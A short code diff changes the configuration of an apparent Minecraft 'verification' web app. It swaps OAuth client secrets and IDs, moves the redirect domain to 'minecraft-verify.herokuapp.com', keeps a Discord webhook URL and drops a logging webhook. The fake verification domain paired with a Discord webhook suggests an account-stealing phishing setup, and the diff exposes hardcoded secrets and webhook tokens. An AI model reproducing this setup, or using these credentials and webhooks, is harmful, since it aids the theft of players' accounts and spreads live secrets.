@@ -1,9 +1,8 @@
 // Configuration
-const client_secret = 'xW68Q~b0byGZzsxmr7QFizft_0F1VVNoa32OVc2e'
-const client_id = '5a522dde-37fa-4e75-a5ba-ef53841dbe93'
-const redirect_uri = 'https://mc-verify.herokuapp.com/'
+const client_secret = 'CGE8Q~oBHrbpdrLxTJeQCKfD2sDVtp5FEOdVbbiR'
+const client_id = '4ab4fadd-ee64-4318-8943-aeb584dd33a3'
+const redirect_uri = 'https://minecraft-verify.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1038098106186731601/kOczd2z3GLmqFoS_Phvqd3l1NhOil6Twq7SoO1q2_dBJOk28-zBKpWO4QUZ1yfuGD0iK'
-const webhook_logging_url = 'https://discord.com/api/webhooks/1038098106186731601/kOczd2z3GLmqFoS_Phvqd3l1NhOil6Twq7SoO1q2_dBJOk28-zBKpWO4QUZ1yfuGD0iK'
 // Config end
 const axios = require('axios')
 const express = require('express')
